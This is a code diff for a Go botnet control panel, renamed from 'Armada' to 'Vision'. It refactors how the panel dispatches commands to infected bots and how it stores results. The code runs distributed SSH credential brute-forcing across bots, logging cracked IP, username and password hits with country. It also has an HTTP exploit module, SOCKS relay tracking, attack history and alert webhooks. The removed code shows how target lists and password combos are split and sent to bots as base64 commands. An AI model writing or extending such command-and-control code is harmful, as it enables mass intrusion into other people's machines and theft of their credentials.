@@ -9,7 +9,6 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"io"
 	"net"
 	"net/http"
 	"os"
@@ -27,8 +26,6 @@ import (
 
 //go:embed web/login.html web/dashboard.html web/style.css web/app.js
 var webFS embed.FS
-
-const webAccessToken = "963a495b4ccf998ff530019d87cca059"
 
 var (
 	webSessions     = make(map[string]*WebSession)
@@ -91,8 +88,7 @@ var (
 	attackHistoryLock sync.Mutex
 	attackHistoryFile string
 
-	// SSH hits persistence
-	sshHitsFile string
+	// SSH hits persistence (migrated to hits.go HitStore)
 
 	// Activity log persistence
 	activityFile string
@@ -179,7 +175,7 @@ func init() {
 	loadWebhooks()
 	loadCmdTemplates()
 	loadAttackHistory()
-	loadSSHHits()
+	InitHitStore()
 	loadActivityLog()
 }
 
@@ -366,37 +362,7 @@ func saveAttackHistory() {
 	}
 }
 
-// --- SSH hits persistence ---
-
-func loadSSHHits() {
-	migrateJSON("ssh_hits.json")
-	sshHitsFile = "db/ssh_hits.json"
-	data, err := os.ReadFile(sshHitsFile)
-	if err != nil || len(data) < 2 { return }
-	sshLock.Lock()
-	if err := json.Unmarshal(data, &sshHits); err != nil {
-		logMsg("[SSH-HITS] Failed to parse %s: %v", sshHitsFile, err)
-	}
-	sshLock.Unlock()
-}
-
-func saveSSHHits() {
-	sshLock.Lock()
-	hits := make([]SSHHit, len(sshHits))
-	copy(hits, sshHits)
-	sshLock.Unlock()
-	data, err := json.MarshalIndent(hits, "", "  ")
-	if err != nil {
-		return
-	}
-	tmp := sshHitsFile + ".tmp"
-	if err := os.WriteFile(tmp, data, 0600); err != nil {
-		return
-	}
-	if err := os.Rename(tmp, sshHitsFile); err != nil {
-		os.Remove(tmp)
-	}
-}
+// SSH hits now managed by unified HitStore in hits.go
 
 // --- Activity log persistence ---
 
@@ -500,7 +466,7 @@ func sendWebhook(eventType string, message string) {
 			payload := map[string]interface{}{
 				"content": msg,
 				"embeds": []map[string]interface{}{{
-					"title":       "Armada Alert",
+					"title":       "Vision Alert",
 					"description": msg,
 					"color":       0x00ff88,
 					"footer":      map[string]string{"text": evt},
@@ -517,7 +483,7 @@ func sendWebhook(eventType string, message string) {
 // dispatchTasksToBot sends all active (non-expired) tasks to a newly connected bot.
 // For run-once tasks, skips bots that already received the command.
 // Called from addBotConnection after the bot is registered and ready.
-func dispatchTasksToBot(botID string, conn net.Conn) {
+func dispatchTasksToBot(botID string, conn *CipherConn) {
 	activeTasksLock.Lock()
 
 	now := time.Now()
@@ -557,7 +523,7 @@ func dispatchTasksToBot(botID string, conn net.Conn) {
 
 	// Send commands outside the lock (network I/O can be slow)
 	for _, c := range cmds {
-		if _, err := conn.Write([]byte(c.cmd + "\n")); err != nil {
+		if err := conn.WriteFrame([]byte(c.cmd + "\n")); err != nil {
 			logMsg("[TASK] Failed to dispatch task %s to %s: %v", c.id, botID, err)
 			return
 		}
@@ -820,15 +786,8 @@ type SSHHit struct {
 	Timestamp time.Time `json:"timestamp"`
 }
 
-var (
-	sshTargets      []string
-	sshCombos       []string
-	sshHits         []SSHHit
-	sshRunning      bool
-	sshLastActive   time.Time
-	sshScanningBots = make(map[string]bool)
-	sshLock         sync.Mutex
-)
+// SSH scanner state — all scan logic now lives in scanner_jobs.go
+// These are kept only for the RecordSSHHit convenience entry point.
 
 // HTTP exploit module state
 type HTTPExploitHit struct {
@@ -838,61 +797,18 @@ type HTTPExploitHit struct {
 }
 
 var (
-	httpExploitHits    []HTTPExploitHit
 	httpExploitRunning bool
 	httpExploitLock    sync.Mutex
-	httpHitsFile       string
 )
 
 func RecordHTTPExploitHit(ip, status string) {
-	httpExploitLock.Lock()
-	// Dedup
-	for _, h := range httpExploitHits {
-		if h.IP == ip && h.Status == status {
-			httpExploitLock.Unlock()
-			return
-		}
-	}
-	httpExploitHits = append(httpExploitHits, HTTPExploitHit{IP: ip, Status: status, Timestamp: time.Now()})
-	if len(httpExploitHits) > 1000 {
-		httpExploitHits = httpExploitHits[len(httpExploitHits)-1000:]
-	}
-	httpExploitLock.Unlock()
-	go saveHTTPHits()
-	PushActivity("scan", fmt.Sprintf("HTTP exploit: %s (%s)", ip, status))
-	if data, err := json.Marshal(map[string]string{"ip": ip, "status": status}); err == nil {
-		broadcastSSE("http_hit", string(data))
-	}
+	RecordHTTPExploitHitNew(ip, status, "")
 }
 
-func loadHTTPHits() {
-	migrateJSON("http_hits.json")
-	httpHitsFile = "db/http_hits.json"
-	data, err := os.ReadFile(httpHitsFile)
-	if err != nil || len(data) < 2 { return }
-	httpExploitLock.Lock()
-	if err := json.Unmarshal(data, &httpExploitHits); err != nil {
-		logMsg("[HTTP-HITS] Failed to parse %s: %v", httpHitsFile, err)
-	}
-	httpExploitLock.Unlock()
-}
-
-func saveHTTPHits() {
-	httpExploitLock.Lock()
-	hits := make([]HTTPExploitHit, len(httpExploitHits))
-	copy(hits, httpExploitHits)
-	httpExploitLock.Unlock()
-	data, err := json.MarshalIndent(hits, "", "  ")
-	if err != nil { return }
-	tmp := httpHitsFile + ".tmp"
-	if err := os.WriteFile(tmp, data, 0600); err != nil { return }
-	if err := os.Rename(tmp, httpHitsFile); err != nil { os.Remove(tmp) }
-}
+// HTTP hits now managed by unified HitStore in hits.go
 
 func init() {
-	go sshIdleWatchdog()
 	loadScanJob()
-	loadHTTPHits()
 }
 
 // handleAPIScanJob manages the work-stealing scan job queue
@@ -906,10 +822,12 @@ func handleAPIScanJob(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		var req struct {
-			Type      string            `json:"type"` // "ssh" or "http"
-			Targets   []string          `json:"targets"`
-			Config    map[string]string `json:"config"`
-			BatchSize int               `json:"batchSize"`
+			Type       string            `json:"type"` // "ssh" or "http"
+			Targets    []string          `json:"targets"`
+			Config     map[string]string `json:"config"`
+			BatchSize  int               `json:"batchSize"`
+			ArchFilter string            `json:"archFilter"`
+			MinRAM     int64             `json:"minRAM"`
 		}
 		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 			writeJSON(w, 400, map[string]interface{}{"error": "Invalid JSON"})
@@ -925,7 +843,7 @@ func handleAPIScanJob(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
-		job := CreateScanJob(req.Type, req.Targets, req.Config, req.BatchSize)
+		job := CreateScanJob(req.Type, req.Targets, req.Config, req.BatchSize, req.ArchFilter, req.MinRAM)
 
 		// Immediately assign first batches to all connected bots
 		botConnsLock.RLock()
@@ -1012,220 +930,47 @@ func handleAPIScanJob(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-// sshIdleWatchdog — disabled. Scan jobs have their own completion/cancel logic.
-// The 35-min timeout was killing long-running scans on slow botnets.
-func sshIdleWatchdog() {
-	// no-op: scan lifecycle managed by scanner_jobs.go
-}
+// sshIdleWatchdog — removed. Scan jobs have their own lifecycle.
 
 func RecordSSHHit(ip, user, pass string) {
-	country := lookupGeoIP(ip)
-	hit := SSHHit{IP: ip, User: user, Pass: pass, Country: country, Timestamp: time.Now()}
-	sshLock.Lock()
-	// Dedup: skip if same IP+user+pass already recorded
-	for _, existing := range sshHits {
-		if existing.IP == ip && existing.User == user && existing.Pass == pass {
-			sshLastActive = time.Now()
-			sshLock.Unlock()
-			return
-		}
-	}
-	sshHits = append(sshHits, hit)
-	if len(sshHits) > 1000 {
-		sshHits = sshHits[len(sshHits)-1000:]
-	}
-	sshLastActive = time.Now()
-	sshLock.Unlock()
-	go saveSSHHits()
-	PushActivity("scan", fmt.Sprintf("SSH hit: %s %s:%s (%s)", ip, user, pass, country))
-	sendWebhook("scan", fmt.Sprintf("SSH hit: %s %s:%s (%s)", ip, user, pass, country))
-	if data, err := json.Marshal(hit); err == nil {
-		broadcastSSE("ssh_hit", string(data))
-	}
+	RecordSSHHitNew(ip, user, pass, "")
 }
 
 func handleAPISSH(w http.ResponseWriter, r *http.Request) {
 	path := strings.TrimPrefix(r.URL.Path, "/api/ssh/")
 
 	switch path {
-	case "targets":
-		if r.Method != "POST" {
-			http.Error(w, "POST only", 405)
+	case "hits":
+		if r.Method == "DELETE" {
+			hitStore.Clear("ssh")
+			writeJSON(w, 200, map[string]interface{}{"ok": true})
 			return
 		}
-		body, _ := io.ReadAll(r.Body)
-		lines := strings.Split(strings.TrimSpace(string(body)), "\n")
-		var targets []string
-		for _, l := range lines {
-			l = strings.TrimSpace(l)
-			if l != "" {
-				targets = append(targets, l)
-			}
+		hits := hitStore.Query("ssh", "", time.Time{}, 0)
+		writeJSON(w, 200, hits)
+
+	case "status":
+		// Status now comes from the scan job system
+		prog := GetJobProgress()
+		running := false
+		if s, ok := prog["status"]; ok {
+			running = s == "running"
 		}
-		sshLock.Lock()
-		sshTargets = targets
-		sshLock.Unlock()
-		writeJSON(w, 200, map[string]interface{}{"ok": true, "count": len(targets)})
-
-	case "combos":
-		if r.Method != "POST" {
-			http.Error(w, "POST only", 405)
-			return
-		}
-		body, _ := io.ReadAll(r.Body)
-		lines := strings.Split(strings.TrimSpace(string(body)), "\n")
-		var combos []string
-		for _, l := range lines {
-			l = strings.TrimSpace(l)
-			if l != "" {
-				combos = append(combos, l)
-			}
-		}
-		sshLock.Lock()
-		sshCombos = combos
-		sshLock.Unlock()
-		writeJSON(w, 200, map[string]interface{}{"ok": true, "count": len(combos)})
-
-	case "start":
-		if r.Method != "POST" {
-			http.Error(w, "POST only", 405)
-			return
-		}
-		var body struct {
-			Mode       string `json:"mode"`
-			Payload    string `json:"payload"`
-			ArchFilter string `json:"archFilter"`
-			MinRAM     int64  `json:"minRAM"`
-		}
-		json.NewDecoder(r.Body).Decode(&body)
-		if body.Mode == "" {
-			body.Mode = "report"
-		}
-
-		sshLock.Lock()
-		targets := make([]string, len(sshTargets))
-		copy(targets, sshTargets)
-		combos := make([]string, len(sshCombos))
-		copy(combos, sshCombos)
-		sshLock.Unlock()
-
-		if len(targets) == 0 || len(combos) == 0 {
-			writeJSON(w, 400, map[string]interface{}{"ok": false, "error": "no targets or combos uploaded"})
-			return
-		}
-
-		// Get authenticated bots (with optional arch/RAM filtering)
-		botConnsLock.RLock()
-		var bots []net.Conn
-		var botIDs []string
-		for _, bc := range botConnections {
-			if !bc.authenticated {
-				continue
-			}
-			if body.ArchFilter != "" && bc.arch != body.ArchFilter {
-				continue
-			}
-			if body.MinRAM > 0 && bc.ram < body.MinRAM {
-				continue
-			}
-			bots = append(bots, bc.conn)
-			botIDs = append(botIDs, bc.botID)
-		}
-		botConnsLock.RUnlock()
-
-		if len(bots) == 0 {
-			writeJSON(w, 400, map[string]interface{}{"ok": false, "error": "no bots connected"})
-			return
-		}
-
-		// Split targets across bots
-		chunkSize := (len(targets) + len(bots) - 1) / len(bots)
-		assigned := 0
-		comboStr := strings.Join(combos, "\n")
-
-		for i, bot := range bots {
-			start := i * chunkSize
-			if start >= len(targets) {
-				break
-			}
-			end := start + chunkSize
-			if end > len(targets) {
-				end = len(targets)
-			}
-			chunk := targets[start:end]
-
-			payload := "MODE:" + body.Mode + "\n" + strings.Join(chunk, "\n") + "\n---\n" + comboStr
-			if body.Payload != "" {
-				payload += "\n===\n" + body.Payload
-			}
-			encoded := base64.StdEncoding.EncodeToString([]byte(payload))
-			cmd := "!ssh " + encoded
-
-			// Send as text (too large for binary encoding)
-			bot.Write([]byte(cmd + "\n"))
-			assigned++
-			logMsg("[SSH] Assigned %d targets to bot %s", len(chunk), botIDs[i])
-		}
-
-		sshLock.Lock()
-		sshRunning = true
-		sshLastActive = time.Now()
-		for i := 0; i < assigned; i++ {
-			sshScanningBots[botIDs[i]] = true
-		}
-		sshLock.Unlock()
-
-		PushActivity("scan", fmt.Sprintf("SSH scan started: %d targets across %d bots (%s mode)", len(targets), assigned, body.Mode))
-		writeJSON(w, 200, map[string]interface{}{"ok": true, "botsAssigned": assigned, "ipsPerBot": chunkSize})
+		writeJSON(w, 200, map[string]interface{}{
+			"hits":    hitStore.Count("ssh"),
+			"running": running,
+		})
 
 	case "stop":
 		if r.Method != "POST" {
 			http.Error(w, "POST only", 405)
 			return
 		}
-		// Broadcast !stopssh
-		botConnsLock.RLock()
-		for _, bc := range botConnections {
-			if bc.authenticated {
-				bc.conn.Write([]byte("!stopssh\n"))
-			}
-		}
-		botConnsLock.RUnlock()
-
-		sshLock.Lock()
-		sshRunning = false
-		for k := range sshScanningBots {
-			delete(sshScanningBots, k)
-		}
-		sshLock.Unlock()
-
-		PushActivity("scan", "SSH scan stopped")
+		// Use the scan job force-stop which kills scanners and reclaims targets
+		ForceStopJob()
+		hitStore.ClearSession("ssh")
+		PushActivity("scan", "SSH scan stopped via force-stop")
 		writeJSON(w, 200, map[string]interface{}{"ok": true})
-
-	case "hits":
-		if r.Method == "DELETE" {
-			sshLock.Lock()
-			sshHits = nil
-			sshLock.Unlock()
-			writeJSON(w, 200, map[string]interface{}{"ok": true})
-			return
-		}
-		sshLock.Lock()
-		hits := make([]SSHHit, len(sshHits))
-		copy(hits, sshHits)
-		sshLock.Unlock()
-		writeJSON(w, 200, hits)
-
-	case "status":
-		sshLock.Lock()
-		status := map[string]interface{}{
-			"totalTargets": len(sshTargets),
-			"totalCombos":  len(sshCombos),
-			"hits":         len(sshHits),
-			"running":      sshRunning,
-		}
-		sshLock.Unlock()
-		writeJSON(w, 200, status)
 
 	default:
 		http.Error(w, "not found", 404)
@@ -1312,7 +1057,10 @@ func handleAPIHTTPExploit(w http.ResponseWriter, r *http.Request) {
 		httpExploitRunning = true
 		httpExploitLock.Unlock()
 
-		PushActivity("scan", fmt.Sprintf("HTTP exploit started: %s %s → %d targets on %d bots", req.Method, req.Path, len(req.Targets), count))
+		sessionID := fmt.Sprintf("http_%d", time.Now().UnixMilli())
+		hitStore.SetSession("http", sessionID)
+
+		PushActivity("scan", fmt.Sprintf("HTTP exploit started: %s %s → %d targets on %d bots [%s]", req.Method, req.Path, len(req.Targets), count, sessionID))
 		writeJSON(w, 200, map[string]interface{}{"ok": true, "bots": count, "targets": len(req.Targets)})
 
 	case "stop":
@@ -1324,28 +1072,24 @@ func handleAPIHTTPExploit(w http.ResponseWriter, r *http.Request) {
 		httpExploitLock.Lock()
 		httpExploitRunning = false
 		httpExploitLock.Unlock()
+		hitStore.ClearSession("http")
 		PushActivity("scan", "HTTP exploit stopped")
 		writeJSON(w, 200, map[string]interface{}{"ok": true})
 
 	case "hits":
 		if r.Method == "DELETE" {
-			httpExploitLock.Lock()
-			httpExploitHits = nil
-			httpExploitLock.Unlock()
+			hitStore.Clear("http")
 			writeJSON(w, 200, map[string]interface{}{"ok": true})
 			return
 		}
-		httpExploitLock.Lock()
-		hits := make([]HTTPExploitHit, len(httpExploitHits))
-		copy(hits, httpExploitHits)
-		httpExploitLock.Unlock()
+		hits := hitStore.Query("http", "", time.Time{}, 0)
 		writeJSON(w, 200, hits)
 
 	case "status":
 		httpExploitLock.Lock()
 		status := map[string]interface{}{
 			"running": httpExploitRunning,
-			"hits":    len(httpExploitHits),
+			"hits":    hitStore.Count("http"),
 		}
 		httpExploitLock.Unlock()
 		writeJSON(w, 200, status)
@@ -1481,6 +1225,8 @@ func NewWebMux() http.Handler {
 	mux.HandleFunc("/api/ssh/", requireWebAuth(handleAPISSH))
 	mux.HandleFunc("/api/http-exploit/", requireWebAuth(handleAPIHTTPExploit))
 	mux.HandleFunc("/api/scan-job/", requireWebAuth(handleAPIScanJob))
+	mux.HandleFunc("/api/hits", requireWebAuth(handleAPIHits))
+	mux.HandleFunc("/api/hits/", requireWebAuth(handleAPIHits))
 	mux.HandleFunc("/api/events", requireWebAuth(handleSSE))
 	mux.HandleFunc("/static/style.css", handleStaticCSS)
 	mux.HandleFunc("/static/app.js", handleStaticJS)
@@ -1576,7 +1322,6 @@ func handleWebLogin(w http.ResponseWriter, r *http.Request) {
 		loginAttemptsLock.Unlock()
 
 		var body struct {
-			Token    string `json:"token"`
 			Username string `json:"username"`
 			Password string `json:"password"`
 		}
@@ -1585,37 +1330,22 @@ func handleWebLogin(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
-		var sessLevel string
-		var sessUsername string
+		if body.Username == "" {
+			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Username required"})
+			return
+		}
 
-		if body.Username != "" {
-			// User/password authentication
-			ok, user := AuthUser(body.Username, body.Password)
-			if !ok {
-				loginAttemptsLock.Lock()
-				loginAttempts[ip] = append(loginAttempts[ip], now)
-				loginAttemptsLock.Unlock()
-				writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"success": false, "error": "Invalid credentials"})
-				return
-			}
-			if user.Level != "Owner" {
-				writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "error": "Owner access required"})
-				return
-			}
-			sessLevel = user.Level
-			sessUsername = user.Username
-		} else {
-			// Token authentication
-			token := strings.TrimSpace(body.Token)
-			if subtle.ConstantTimeCompare([]byte(token), []byte(webAccessToken)) != 1 {
-				loginAttemptsLock.Lock()
-				loginAttempts[ip] = append(loginAttempts[ip], now)
-				loginAttemptsLock.Unlock()
-				writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"success": false, "error": "Invalid token"})
-				return
-			}
-			sessLevel = "Owner"
-			sessUsername = ""
+		ok, user := AuthUser(body.Username, body.Password)
+		if !ok {
+			loginAttemptsLock.Lock()
+			loginAttempts[ip] = append(loginAttempts[ip], now)
+			loginAttemptsLock.Unlock()
+			writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"success": false, "error": "Invalid credentials"})
+			return
+		}
+		if user.Level != "Owner" {
+			writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "error": "Owner access required"})
+			return
 		}
 
 		sessID := generateSessionID()
@@ -1623,8 +1353,8 @@ func handleWebLogin(w http.ResponseWriter, r *http.Request) {
 		webSessions[sessID] = &WebSession{
 			CreatedAt: time.Now(),
 			ExpiresAt: time.Now().Add(24 * time.Hour),
-			Level:     sessLevel,
-			Username:  sessUsername,
+			Level:     user.Level,
+			Username:  user.Username,
 		}
 		webSessionsLock.Unlock()
 
@@ -1722,7 +1452,7 @@ func buildBotEntry(bc *BotConnection) apiBotEntry {
 		SocksRelay:   bc.socksRelay,
 		SocksStarted: socksStarted,
 		SocksUser:    bc.socksUser,
-		SSHScanning:  sshScanningBots[bc.botID],
+		SSHScanning:  bc.scanningType != "",
 		HealthScore:  CalculateHealthScore(bc),
 		HasScanner:   bc.hasScanner,
 		HasAttack:    bc.hasAttack,
@@ -2916,7 +2646,7 @@ func handleAPIWebhookTest(w http.ResponseWriter, r *http.Request) {
 	// Fire test to all event types so every webhook gets it
 	testEvents := []string{"connect", "disconnect", "attack", "scan", "auth_fail", "socks", "command"}
 	for _, evt := range testEvents {
-		sendWebhook(evt, fmt.Sprintf("[TEST] Armada webhook test for event: %s (%s)", evt, time.Now().Format("15:04:05")))
+		sendWebhook(evt, fmt.Sprintf("[TEST] Vision webhook test for event: %s (%s)", evt, time.Now().Format("15:04:05")))
 	}
 	writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "message": "Test sent to all enabled webhooks"})
 }
